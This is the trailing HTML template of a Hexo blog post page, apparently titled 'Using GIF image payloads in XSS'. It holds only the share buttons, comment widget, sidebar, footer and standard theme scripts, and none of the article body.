+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2017/02/15/gif-xss-payloads/"
+               data-title="在xss中使用gif图片payloads" data-url="http://blkstone.github.io/2017/02/15/gif-xss-payloads/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">254</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">98</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#正文"><span class="nav-number">1.</span> <span class="nav-text">正文</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">2.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2017
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
